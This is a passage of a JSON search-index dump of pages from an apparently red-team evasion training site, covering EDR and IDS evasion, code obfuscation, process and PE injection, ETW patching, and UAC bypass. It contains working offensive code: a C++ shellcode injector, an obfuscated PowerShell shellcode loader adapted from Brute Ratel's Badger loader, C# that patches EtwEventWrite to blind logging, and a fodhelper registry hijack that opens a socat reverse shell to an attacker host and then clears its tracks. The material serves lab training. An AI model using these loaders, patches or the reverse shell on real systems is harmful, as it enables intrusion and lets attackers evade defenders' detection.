\"%d.exe\" % i output = \"\".join(str(e) for e in current) open(path, \"wb\").write(output) i += 1 print(\"done\") Then search for intact unique properties of the file. For example, when bit-flipping msbuild , use signtool to search for a file with useable certificate. This will guarantee that the functionality of the file is not broken, and the application will maintain its signed attribution. To leverage a script to loop through the bit-flipped list and verify functional variants: FOR /L %%A IN (1,1,10000) DO ( signtool verify /v /a flipped\\\\%%A.exe ) Entropy  Entropy can be defined as “the randomness of the data in a file used to determine whether a file contains hidden data or suspicious scripts.” EDRs and other scanners often leverage entropy to identify potential suspicious files or contribute to an overall malicious score. Entropy can be “too high” for obfuscated scripts, specifically when obscuring identifiable information such as variables or functions. Depending on the EDR employed, a “suspicious” entropy value is ~ greater than 6.8. To lower entropy, replace random identifiers with randomly selected English words. For example, change a variable from q234uf to nature . To prove the efficacy of changing identifiers, observe how the entropy changes using CyberChef . Resources  An Empirical Assessment of Endpoint Detection and Response Systems against Advanced Persistent Threats Attack Vectors",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "4a9fd8bcd483a6efec78c2ea775c1e18",
    "u": "https://evasion.tymyrddin.dev/docs/netsec/nextgen",
    "t": "Next-Generation security ",
    "c": "Next-Generation security  IDPS  The primary functions of IDPS solutions can be broken down into four main categories: Monitoring: IDPS monitors IT systems using either signature-based or anomaly-based intrusion detection to identify abnormal behavior and signature malicious activity. Alerts: After identifying potential threats, IDPS software will log and send out alert notifications to inform administrators of abnormal activity. Remediation: IDPS tools provide blocking mechanisms for malicious threats, giving administrators time to take action. In some cases, IT teams may not need to take action after an attack is blocked. Maintenance: Besides monitoring for abnormal behavior, IDPS tools can also monitor the performance of IT hardware and security components with health checks. This health monitoring ensures a security infrastructure is operating correctly at all times. NGNIPS  Next-Generation Network IPS (NGNIPS) have the following five characteristics according to Gartner (in 2013): Standard first-generation IPS capabilities: A next-generation network IPS can do what a traditional network IPS can do. Application awareness and full-stack visibility: Identify traffic from various applications and enforce network security policies. An NGNIPS must be able to understand up to the application layer. Context awareness: Use information from sources outside the IPS to aid in blocking decisions. Content awareness: Able to inspect and classify files, such as executable programs and documents, in inbound and outbound traffic. Agile engine: Support upgrade paths to benefit from new information feeds. NGIPS and NGFW are not the same and having both can be very useful. Challenges  Some challenges to keep an eye on when it comes to Next-Generation security: False positives: You will almost undoubtedly run into the problem of false-positive alerts, which can waste time and resources. Be vigilant when notified of potentially malicious behaviour, but also be aware that it is not a guarantee of an attack. Staffing: Cybersecurity is so essential to organisations that there is a shortage of available security professionals. Before implementing an IDPS system, ensure you’ve put together a team that has the capabilities to manage it effectively. Genuine risks: Beyond just managing an IDPS, there will be cases where administrator intervention is required. An IDPS can block many attacks but not all. Ensure teams keep their knowledge up-to-date on new types of attacks, so they’re not blindsided when one is identified. Ubiquity of data: The omnipresence of data, of all kinds, has necessitated the spread of organisational roles that manage, organise and safeguard this data. Reputations and compliance with regulations are at stake here. How much does non-compliance cost? And in case of a breach, dents in reputation? Resources  Gartner: Next-Generation IPS Technology Disrupts the IPS Market (in 2013) Know When to Have a Dedicated NGIPS vs. NGFW Building the Next Generation of Security and Privacy Professionals (in 2022)",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "5b77d17b0886422945932879e3a1baf1",
    "u": "https://evasion.tymyrddin.dev/docs/obfuscation/principles",
    "t": "Principles ",
    "c": "Principles  Overview of each taxonomy layer. To use the taxonomy, we can determine an objective and then pick a method that fits our requirements. For example, suppose we want to obfuscate the layout of our code but cannot modify the existing code. In that case, we can inject junk code. Concatenation can open the doors to several vectors to modify signatures or manipulate other aspects of an application. Attackers can also use it preemptively to break up all objects of a program and attempt to remove all signatures at once without hunting them down, commonly seen in obfuscators. Adversaries can leverage advanced logic and mathematics to create more complex and harder-to-understand code to combat analysis and reverse engineering. An analyst can attempt to understand a program’s function through its control flow; while problematic, logic and control flow is almost effortless to manipulate and make arbitrarily confusing. When dealing with control flow, an attacker aims to introduce enough obscure and arbitrary logic to confuse an analyst but not too much to raise further suspicion or potentially be detected by a platform as malicious. To craft arbitrary control flow patterns an attacker can leverage maths, logic, and/or other complex algorithms to inject a different control flow into a malicious function. Identifiable information can be one of the most critical components an analyst can use to dissect and attempt to understand a malicious program. By limiting the amount of identifiable information (variables, function names, etc.), an analyst has, the better chance an attacker has they won’t be able to reconstruct its original function. Resources  Layered Obfuscation Taxonomy",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "6916ed5edb536444ea3c6a04b57e718c",
    "u": "https://evasion.tymyrddin.dev/docs/uac/readme",
    "t": "Introduction ",
    "c": "Introduction  THM Room: Bypassing UAC What?  Common ways to bypass User Account Control (UAC) in Windows hosts. Why?  Breaking out of highly restrictive environments and fully elevating privileges on target hosts. How?  GUI based bypasses Auto-elevating processes Improving the Fodhelper exploit Bypassing Always Notify Automated exploitation",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "4dc6707fb298da56c34af709e25bdd4b",
    "u": "https://evasion.tymyrddin.dev/docs/injection/trickbot",
    "t": "TrickBot ",
    "c": "TrickBot  Open Target Process ( OpenProcess ) Allocate memory ( VirtualAllocEx ) Copy function into allocated memory ( WriteProcessMemory ) Copy shellcode into allocated memory ( WriteProcessMemory ) Flush cache to commit changes ( FlushInstructionCache ) Create a remote thread ( CreateRemoteThread ) Resume the thread or fallback to create a new user thread ( ResumeThread or RtlCreateUserThread) Resources  Most recent first: Trickbot  VB2017: Turning Trickbot: decoding an encrypted command-and-control channel Uperesia: How Trickbot tricks its victims Flashpoint: With a boost from Necurs, Trickbot expands its targeting to numerous U.S. financial institutions MalwareBytes: Trick Bot – Dyreza’s successor Sentinel:How TrickBot Malware Hooking Engine Targets Windows 10 Browsers Dyre(za)  VB2015: Speaking Dyreza protocol. Advantages of ‘learning’ a new language Blueliv: Chasing cybercrime: network insights of Dyre and Dridex Trojan bankers",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "0668ab9b712c07b87b7e481b8e4a0d7a",
    "u": "https://evasion.tymyrddin.dev/docs/obfuscation/info",
    "t": "Protecting and stripping identifiable information ",
    "c": "Protecting and stripping identifiable information  Consider three different types of identifiable data: object names, code structure, and file/compilation properties. Object names  Object names offer some of the most significant insight into a program’s functionality and can reveal the exact purpose of a function. An analyst can still deconstruct the purpose of a function from its behavior, but this is much harder if there is no context to the function. The importance of literal object names may change depending on if the language is compiled or interpreted. If an interpreted language such as Python or PowerShell is used, then all objects matter and must be modified. If a compiled language such as C, C# or C++ is used, only objects appearing in the strings are generally significant. An object may appear in the strings by any function that produces an IO operation. Example in C++  As example, a process injector written in C++ that reports its status to the command line: #include \"windows.h\" #include <iostream> #include <string> using namespace std; int main(int argc, char* argv[]) { unsigned char shellcode[] = \"\"; HANDLE processHandle; HANDLE remoteThread; PVOID remoteBuffer; string leaked = \"This was leaked in the strings\"; processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1]))); cout << \"Handle obtained for\" << processHandle; remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); cout << \"Buffer Created\"; WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL); cout << \"Process written with buffer\" << remoteBuffer; remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL); CloseHandle(processHandle); cout << \"Closing handle\" << processHandle; cout << leaked; return 0; } Compare with obfuscated version: #include \"windows.h\" int main(int argc, char* argv[]) { unsigned char awoler[] = \"\"; HANDLE awerfu; HANDLE rwfhbf; PVOID iauwef; awerfu = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1]))); iauwef = VirtualAllocEx(awerfu, NULL, sizeof awoler, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); WriteProcessMemory(awerfu, iauwef, awoler, sizeof awoler, NULL); rwfhbf = CreateRemoteThread(awerfu, NULL, 0, (LPTHREAD_START_ROUTINE)iauwef, NULL, 0, NULL); CloseHandle(awerfu); return 0; } Example with powershell  Compare the deprecated Badger PowerShell loader from the BRC4 Community Kit with: Set-StrictMode -Version 2 [Byte[]] $Ait1m = @(0x3d, 0x50, 0x51, 0x57, 0x50, 0x4e, 0x5f, 0x50, 0x4f, 0x2f, 0x50, 0x57, 0x50, 0x52, 0x4c, 0x5f, 0x50) [Byte[]] $ahv3I = @(0x34, 0x59, 0x38, 0x50, 0x58, 0x5a, 0x5d, 0x64, 0x38, 0x5a, 0x4f, 0x60, 0x57, 0x50) [Byte[]] $Moo5y = @(0x38, 0x64, 0x2f, 0x50, 0x57, 0x50, 0x52, 0x4c, 0x5f, 0x50, 0x3f, 0x64, 0x5b, 0x50) [Byte[]] $ooR5o = @(0x2e, 0x57, 0x4c, 0x5e, 0x5e, 0x17, 0x0b, 0x3b, 0x60, 0x4d, 0x57, 0x54, 0x4e, 0x17, 0x0b, 0x3e, 0x50, 0x4c, 0x57, 0x50, 0x4f, 0x17, 0x0b, 0x2c, 0x59, 0x5e, 0x54, 0x2e, 0x57, 0x4c, 0x5e, 0x5e, 0x17, 0x0b, 0x2c, 0x60, 0x5f, 0x5a, 0x2e, 0x57, 0x4c, 0x5e, 0x5e) [Byte[]] $Reo5o = @(0x3d, 0x60, 0x59, 0x5f, 0x54, 0x58, 0x50, 0x17, 0x0b, 0x38, 0x4c, 0x59, 0x4c, 0x52, 0x50, 0x4f) [Byte[]] $Reib3 = @(0x3d, 0x3f, 0x3e, 0x5b, 0x50, 0x4e, 0x54, 0x4c, 0x57, 0x39, 0x4c, 0x58, 0x50, 0x17, 0x0b, 0x33, 0x54, 0x4f, 0x50, 0x2d, 0x64, 0x3e, 0x54, 0x52, 0x17, 0x0b, 0x3b, 0x60, 0x4d, 0x57, 0x54, 0x4e) [Byte[]] $Thah8 = @(0x3b, 0x60, 0x4d, 0x57, 0x54, 0x4e, 0x17, 0x0b, 0x33, 0x54, 0x4f, 0x50, 0x2d, 0x64, 0x3e, 0x54, 0x52, 0x17, 0x0b, 0x39, 0x50, 0x62, 0x3e, 0x57, 0x5a, 0x5f, 0x17, 0x0b, 0x41, 0x54, 0x5d, 0x5f, 0x60, 0x4c, 0x57) [Byte[]] $ii5Ie = @(0x34, 0x59, 0x61, 0x5a, 0x56, 0x50) [Byte[]] $KooG5 = @(0x38, 0x54, 0x4e, 0x5d, 0x5a, 0x5e, 0x5a, 0x51, 0x5f, 0x19, 0x42, 0x54, 0x59, 0x1e, 0x1d, 0x19, 0x40, 0x59, 0x5e, 0x4c, 0x51, 0x50, 0x39, 0x4c, 0x5f, 0x54, 0x61, 0x50, 0x38, 0x50, 0x5f, 0x53, 0x5a, 0x4f, 0x5e) [Byte[]] $io9iH = @(0x32, 0x50, 0x5f, 0x3b, 0x5d, 0x5a, 0x4e, 0x2c, 0x4f, 0x4f, 0x5d, 0x50, 0x5e, 0x5e) [Byte[]] $Qui5i = @(0x32, 0x50, 0x5f, 0x38, 0x5a, 0x4f, 0x60, 0x57, 0x50, 0x33, 0x4c, 0x59, 0x4f, 0x57, 0x50) [Byte[]] $xee2N = @(0x56, 0x50, 0x5d, 0x59, 0x50, 0x57, 0x1e, 0x1d) [Byte[]] $AD0Pi = @(0x41, 0x54, 0x5d, 0x5f, 0x60, 0x4c, 0x57, 0x2c, 0x57, 0x57, 0x5a, 0x4e) [Byte[]] $ahb3O = @(0x41, 0x54, 0x5d, 0x5f, 0x60, 0x4c, 0x57, 0x3b, 0x5d, 0x5a, 0x5f, 0x50, 0x4e, 0x5f) [Byte[]] $yhe4c = @(0x2E, 0x5D, 0x50, 0x4C, 0x5F, 0x50, 0x3F, 0x53, 0x5D, 0x50, 0x4C, 0x4F) function Get-Robf ($b3tz) { $aisN = [System.Byte[]]::new($b3tz.Count) for ($x = 0; $x -lt $aisN.Count; $x++) { $aisN[$x] = ($b3tz[$x] + 21) } return [System.Text.Encoding]::ASCII.GetString($aisN) } function Get-PA ($vmod, $vproc) { $a = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\\\\\')[-1].Equals('System.dll') }).GetType((Get-Robf $KooG5)) return ($a.GetMethod((Get-Robf $io9iH), [reflection.bindingflags] \"Public,Static\", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null)).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($a.GetMethod((Get-Robf $Qui5i))).Invoke($null, @($vmod)))), $vproc)) } function Get-TDef { Param ( [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters, [Parameter(Position = 1)] [Type] $var_return_type = [Void] ) $vtdef = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName((Get-Robf $Ait1m))), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule((Get-Robf $ahv3I), $false).DefineType((Get-Robf $Moo5y), (Get-Robf $ooR5o), [System.MulticastDelegate]) $vtdef.DefineConstructor((Get-Robf $Reib3), [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags((Get-Robf $Reo5o)) $vtdef.DefineMethod((Get-Robf $ii5Ie), (Get-Robf $Thah8), $var_return_type, $var_parameters).SetImplementationFlags((Get-Robf $Reo5o)) return $vtdef.CreateType() } [Byte[]]$vopcode = @(BADGER_SHELLCODE) $vbuf = ([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-PA (Get-Robf $xee2N) (Get-Robf $AD0Pi)), (Get-TDef @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))).Invoke([IntPtr]::Zero, $vopcode.Length, 0x3000, 0x04) [System.Runtime.InteropServices.Marshal]::Copy($vopcode, 0x0, $vbuf, $vopcode.length) ([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-PA (Get-Robf $xee2N) (Get-Robf $ahb3O)), (Get-TDef @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))).Invoke($vbuf, $vopcode.Length, 0x20, [ref](0)) | Out-Null ([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-PA (Get-Robf $xee2N) (Get-Robf $yhe4c)), (Get-TDef @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([UInt32])))).Invoke(0, 0, $vbuf, [IntPtr]0, 0, [ref](0)) | Out-Null Some cmdlets and functions are kept in their original state to create an application that can still confuse reverse engineers after detection but may not look immediately suspicious. If a malware developer were to obfuscate all cmdlets and functions, it would raise the entropy in both interpreted and compiled languages resulting in higher EDR alert scores. It could also lead to an interpreted snippet appearing suspicious in logs if it is seemingly random or visibly heavily obfuscated. Code structure  Code structure can be a problem when dealing with all aspects of malicious code that are often overlooked and not easily identified. If not adequately addressed in both interpreted and compiled languages, it can lead to signatures or easier reverse engineering from an analyst. As mentioned in the taxonomy paper , junk code and reordering code are both used as additional measures to add complexity to an interpreted...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "776233a64f0a17dd30073b1b506bc84b",
    "u": "https://evasion.tymyrddin.dev/docs/netsec/dos",
    "t": "Evasion via tactical DoS ",
    "c": "Evasion via tactical DoS  Evasion via tactical DoS includes: Launching denial of service against the IDS/IPS Launching denial of Service against the logging server An IDS/IPS requires more processing power as the number of rules grows and the network traffic volume increases. Especially in the case of IDS, the primary response is logging traffic information matching the signature. As a result, you might find it beneficial if you can: Create a huge amount of benign traffic that would simply overload the processing capacity of the IDS/IPS. Create a massive amount of not-malicious traffic that would still make it to the logs. This action would congest the communication channel with the logging server or exceed its disk writing capacity. It is also worth noting that the target can be the IDS operator. By causing a vast number of false positives, you can try to cause “operator fatigue”. Erm. That is ruthless. APT attackers are that, ruthless.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "50ac0f67e2db2d91befd41c50dc996a3",
    "u": "https://evasion.tymyrddin.dev/docs/etw/etw",
    "t": "Study ETW ",
    "c": "Study ETW  Almost all event logging capability within Windows is handled from ETW at both the application and kernel level. While there are other services in place like Event Logging and Trace Logging, these are either extensions of ETW or less prevalent to attackers. Component Purpose Controllers Build and configure sessions Providers Generate events Consumers Interpret events While less important to an attacker than components, event IDs are a core feature of Windows logging. Events are sent and transferred in XML format, the standard for how events are defined and implemented by providers. ETW has visibility over a majority of the operating system, whereas logging generally has limited visibility or detail. The best approach to taking down ETW is to limit its insight as much as possible into the operation while maintaining environment integrity. Approaches  With security best practices in place, it is typical for a modern environment to employ log forwarding. Log forwarding means that the SOC will move or “forward” logs from the host machine to a central server or indexer. Even if an attacker can delete logs from the host machine, they could already be off of the device and secured. Destroying all logs before they were forwarded can present serious suspicion and lead to an investigation. Even if an attacker did control what logs were removed and forwarded, defenders could still track the tampering. These IDs can monitor the process of destroying logs or “log smashing” and pose a clear risk to be detected. Event ID Purpose 1102 Logs when the Windows Security audit log was cleared 104 Logs when the log file was cleared 1100 Logs when the Windows Event Log service was shut down It is possible to bypass these mitigations further or tamper with the logs, but when approaching an environment, as a red team we do not know which security practices are in place, and it is better to take an OPSEC approach: Focus on what logs a malicious technique may result in to keep an environment’s integrity intact. Knowing what may be instrumented against an approach. Most published techniques will target ETW components since that will allow an attacker the most control over the tracing process. There are also some new interesting techniques. ETW Instrumentation  The data/session flow within ETW. Resources  Microsoft:  Event Tracing Microsoft: Trace Message Format File",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "423738103ee9f940ad6a4d25316711cb",
    "u": "https://evasion.tymyrddin.dev/docs/netsec/c2",
    "t": "C2 and IDS/IPS evasion ",
    "c": "C2 and IDS/IPS evasion  Pentesting frameworks, such as Cobalt Strike and Empire, offer Command and Control (C2) profiles. These profiles allow fine-tuning of variables to evade IDS/IPS systems: User-Agent: The tool or framework you are using can expose you via its default-set user-agent. It is always important to set the user-agent to something innocuous and test it to confirm your settings. Sleep Time: The sleep time allows you to control the callback interval between beacon check-ins. In other words, you can control how often the infected system will attempt to connect to the control system. Jitter: This variable lets you add some randomness to the sleep time, specified by the jitter percentage. A jitter of 30% results in a sleep time of ±30% to further evade detection. SSL Certificate: Using authentic-looking SSL certificates will significantly improve chances of evading detection. A worthy investment of time. DNS Beacon: Consider the case when you are using DNS protocol to exfiltrate data. You can fine-tune DNS beacons by setting the DNS servers and the hostname in the DNS query. The hostname will be holding the exfiltrated data. Using such a framework, it is worth creating a custom profile instead of relying on a default one.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "2a08f319c43da8d726e7dc36cb9cc622",
    "u": "https://evasion.tymyrddin.dev/docs/injection/pe",
    "t": "Portable executable injection ",
    "c": "Portable executable injection  PE Injection is generally favored over DLL Injection by malware, because it does not require dropping any files to the disk. When running in memory most, but not all, portable executables make use of 2 structures: Import Address Table (IAT), has all calls to dll functions point to a jump in the process’s jump table, allowing targets to easily be found and changed by the PE loader. Base Relocation Table (Reloc), a table of pointers to every absolute address used in the code. During process initialization, if the process is not being loaded at its base address, the PE loader will modify all the absolute addresses to work with the new base address. The Import Address Table and Reloc Table remain in memory once the process initialization is finished, this makes for a very easy way to inject a process. With the ability to be loaded at any base address and use DLLs at any address, the process can simply get its current base address and image size from the PE header, and copy itself to any region of memory in almost any process. Here is the entire procedure broken down. Get the current images base address and size (from the PE header ). Allocate enough memory for the image inside the processes own address space ( VirtualAlloc ). Have the process copy its own image into the locally allocated memory (memcpy). Allocate memory large enough to fit the image in the target process ( VirtualAllocEx ). Calculate the offset of the reloc table for the image that was copied into the local memory. Iterate the reloc table of the local image and modify all absolute addresses to work at the address returned by VirtualAllocEx. Copy the local image into the memory region allocated in the target process ( WriteProcessMemory ). Calculate the remote address of the function to be executed in the remote process by subtracting the address of the function in the current process by the base address of the current process, then adding it to the address of the allocated memory in the target process. Create a new thread with the start address set to the remote address of the function ( CreateRemoteThread ). Resources  MITRE: Portable executable injection A Comprehensive Guide To PE Structure, The Layman’s Way InfosecInstitute: Presenting the PE header",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "5323b65cd4e355a9c670c68ecf78b624",
    "u": "https://evasion.tymyrddin.dev/docs/firewalls/tunnelling",
    "t": "Evasion using port tunnelling ",
    "c": "Evasion using port tunnelling  Port tunneling is also known as port forwarding and port mapping. In simple terms, this technique forwards the packets sent to one destination port to another destination port. For example, packets sent to port 80 on one system are forwarded to port 8080 on another system. Consider the following case: An SMTP server listening on port 25. It is not possible to connect to the SMTP server because the firewall blocks packets from the Internet sent to destination port 25. Packets sent to destination port 443 are not blocked, so we can send packets to port 443, and after they pass through the firewall, we forward them to port 25. Assume we can run a command of our choice on one of the systems behind the firewall. We can use that system to forward our packets to the SMTP server: ncat -lvnp 443 -c \"ncat TARGET_SERVER 25\" -lvnp 443 listens on TCP port 443 . Because the port number < 1024 , run ncat as root. -c or --sh-exec executes the given command via /bin/sh . ncat TARGET_SERVER 25 will connect to the target server at port 25 . As a result, ncat will listen on port 443 , but it will forward all packets to port 25 on the target server. In this case, the firewall is blocking port 25 and allowing port 443, port tunneling is an efficient way to evade the firewall. Lab  We have a web server listening on the HTTP port, 80 . The firewall is blocking traffic to port 80 from the untrusted network; and traffic to TCP port 8008 is not blocked. There is a vulnerable web-form to set up the ncat listener that forwards the packets received to the forwarded port. Using port tunneling, browse to the web server and retrieve the flag. Set up a port forwarding from port 80 to 8008 on the webserver from the vulnerable form hosted on port 8080 using the vulnerable form: ncat -lvnp 8008 -c \"ncat localhost 80\" On the attacker machine, try to connect netcat to the server with the non-filtered port in the firewall 8008 and request the website with a GET / HTTP request : # nc TARGET_IP 8008 Flag!",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "a020c60f8e8c69e49e59a1006192229c",
    "u": "https://evasion.tymyrddin.dev/docs/land/lolbas",
    "t": "LOLBAS project ",
    "c": "LOLBAS project  LOLBAS stands for Living Off the Land Binaries And Scripts, a project’s primary main goal is to gather and document the Microsoft-signed and built-in tools used as Living Off the Land techniques, including binaries, scripts, and libraries. The criteria for a tool to be considered a “Living Off the Land” technique and accepted as part of the LOLBAS project: Microsoft-signed file native to the OS or downloaded from Microsoft. Having additional interesting unintended functionality not covered by known use cases. Benefits an APT (Advanced Persistent Threat) or Red Team engagement. The LOLBAS project accepts tool submissions that fit one of the following functionalities: Arbitrary code execution File operations, including downloading, uploading, and copying files. Compiling code Persistence, including hiding data in Alternate Data Streams (ADS) or executing at logon. UAC bypass Dumping process memory DLL injection Resources  LOLBAS site",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "30d8fd89e1291cd0f9461e354285d9d6",
    "u": "https://evasion.tymyrddin.dev/docs/etw/patching",
    "t": "Patching tracing functions ",
    "c": "Patching tracing functions  ETW is loaded from the runtime of every new process, commonly originating from the CLR (Common Language Runtime). Within a new process, ETW events are sent from userland and issued directly from the current process. An attacker can write pre-defined opcodes to an in-memory function of ETW to patch and disable functionality. ETW is written from the function EtwEventWrite . The disassembly of that function: 779f2459 33cc xor ecx, esp 779f245b e8501a0100 call ntdll!_security_check_cookie 779f2460 8be5 mov esp, ebp 779f2462 5d pop ebp 779f2463 c21400 ret 14h ret 14h will end the function and returns control to the calling application. At a high level, ETW patching can be broken up into five steps: Obtain a handle for EtwEventWrite Modify memory permissions of the function Write opcode bytes to memory Reset memory permissions of the function (optional) Flush the instruction cache (optional) Code  EtwEventWrite is stored within ntdll . Load the library and obtain the handle using GetProcAddress : var ntdll = Win32.LoadLibrary(\"ntdll.dll\"); var etwFunction = Win32.GetProcAddress(ntdll, \"EtwEventWrite\"); The permission of the function is defined by the flNewProtect parameter; 0x40 enables X , R , or RW access: uint oldProtect; Win32.VirtualProtect( etwFunction, (UIntPtr)patch.Length, 0x40, out oldProtect ); Now the function has the permissions required to write to it, and the pre-defined opcode to patch it is known. Because of writing to a function and not a process, Marshal.Copy can be used to write the opcode. patch(new byte[] { 0xc2, 0x14, 0x00 }); Marshal.Copy( patch, 0, etwEventSend, patch.Length ); Clean to restore memory permissions as they were: VirtualProtect(etwFunction, 4, oldProtect, &oldOldProtect); Make sure the patched function will be executed from the instruction cache: Win32.FlushInstructionCache( etwFunction, NULL ); Compile these steps together and append them to a malicious script or session. After the opcode is written to memory, view the disassembled function again: 779f23c0 c21400 ret 14h 779f23c3 00ec add ah, ch 779f23c5 83e4f8 and esp, 0FFFFFFF8h 779f23c8 81ece0000000 sub esp, 0E0h Once the function is patched in memory, it will always return when EtwEventWrite is called. And that means it might not be a good idea as it may restrict more logs than desired for integrity.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "b8a1b43d7b3ff40e059e4d386eef8f30",
    "u": "https://evasion.tymyrddin.dev/docs/uac/autoelevate",
    "t": "AutoElevating processes ",
    "c": "AutoElevating processes  Some executables can autoelevate, achieving high IL without any user intervention. This applies to most of the Control Panel’s functionality and some executables provided with Windows. mmc.exe will auto elevate depending on the .msc snap-in that the user requests. Most of the .msc files included with Windows will auto elevate. Windows keeps an additional list of executables that auto elevate even when not requested in the manifest. This list includes pkgmgr.exe and spinstall.exe . COM objects can also request auto-elevation by configuring some registry keys . For an application, to auto-elevate: The executable must be signed by the Windows Publisher. The executable must be contained in a trusted directory, like %SystemRoot%/System32/ or %ProgramFiles%/ . Depending on the type of application, additional requirements may apply: Executable files must declare the autoElevate element inside their manifests. To check a file’s manifest using sigcheck (part of the Sysinternals suite): C:\\tools\\> sigcheck64.exe -m c:/windows/system32/msconfig.exe ... <asmv3:application> <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\"> <dpiAware>true</dpiAware> <autoElevate>true</autoElevate> </asmv3:windowsSettings> </asmv3:application> Fodhelper  Fodhelper.exe is one of Windows default executables in charge of managing Windows optional features, including additional languages, applications not installed by default, or other operating system characteristics. Like most of the programs used for system configuration, fodhelper can auto elevate when using default UAC settings so that administrators won’t be prompted for elevation when performing standard administrative tasks. fodhelper can be abused without having access to a GUI. It can be used through a medium integrity remote shell and leveraged into a fully functional high integrity process. This particular technique was discovered by winscripting and has been used in the wild by the Glupteba malware. When Windows opens a file, it checks the registry to know what application to use. The registry holds a key known as Programmatic ID ( ProgID ) for each filetype, where the corresponding application is associated. When for example, trying to open an HTML file, a part of the registry known as the HKEY_CLASSES_ROOT will be checked so that the system knows that it must use your preferred web client to open it. The command to use will be specified under the shell/open/command subkey for each file’s ProgID . In reality, HKEY_CLASSES_ROOT is just a merged view of two different paths on the registry: Path Description HKEY_LOCAL_MACHINE\\Software\\Classes System-wide file associations HKEY_CURRENT_USER\\Software\\Classes Active user's file associations When checking HKEY_CLASSES_ROOT , if there is a user-specific association at HKEY_CURRENT_USER ( HKCU ), it will take priority. If no user-specific association is configured, then the system-wide association at HKEY_LOCAL_MACHINE ( HKLM ) will be used instead. This way, each user can choose their preferred applications separately if desired. fodhelper searches the registry for a specific key of interest under the ms-settings ProgID . By creating an association for that ProgID in the current user’s context under HKCU , we will override the default system-wide association and, therefore, control which command is used to open the file. Since fodhelper is an autoElevate executable, any subprocess it spawns will inherit a high integrity token, effectively bypassing UAC . Lab  Note: Defender is disabled. For abusing fodhelper with Defender enabled, see Improve fodhelper exploit . One of our agents has planted a backdoor on the target server for your convenience. He managed to create an account within the Administrators group, but UAC is preventing the execution of any privileged tasks. To retrieve the flag, he needs you to bypass UAC and get a fully functional high IL shell. To connect to the backdoor: nc MACHINE_IP 9999 Once connected, check if our user is part of the Administrators group and that it is running with a medium integrity token: Microsoft Windows [Version 10.0.17763.1821] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32>whoami whoami myserver\\attacker C:\\Windows\\system32>net user attacker | find \"Local Group\" net user attacker | find \"Local Group\" Local Group Memberships *Administrators *Users C:\\Windows\\system32>whoami /groups | find \"Label\" whoami /groups | find \"Label\" Mandatory Label\\Medium Mandatory Level Label S-1-16-8192 Set the required registry values to associate the ms-settings class to a reverse shell using socat. we need to create an empty value called DelegateExecute for the class association to take effect. If this registry value is not present, the operating system will ignore the command and use the system-wide class association instead. C:\\> set REG_KEY=HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command C:\\> set CMD=\"powershell -windowstyle hidden C:\\Tools\\socat\\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes\" C:\\> reg add %REG_KEY% /v \"DelegateExecute\" /d \"\" /f The operation completed successfully. C:\\> reg add %REG_KEY% /d %CMD% /f The operation completed successfully. Set up a listener on the attack machine: nc -lvp 4444 And execute fodhelper on the target machine: C:\\> fodhelper.exe In the reverse shell, check: C:\\Windows\\system32>whoami /groups | find \"Label\" Mandatory Label\\High Mandatory Level Label S-1-16-12288 Get the flag: C:\\> C:\\flags\\GetFlag-fodhelper.exe And clear tracks: reg delete HKCU\\Software\\Classes\\ms-settings\\ /f",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "fe01b9c5a344b806274c3b083146716d",
    "u": "https://evasion.tymyrddin.dev/docs/uac/env-expansion",
    "t": "Bypassing Always Notify ",
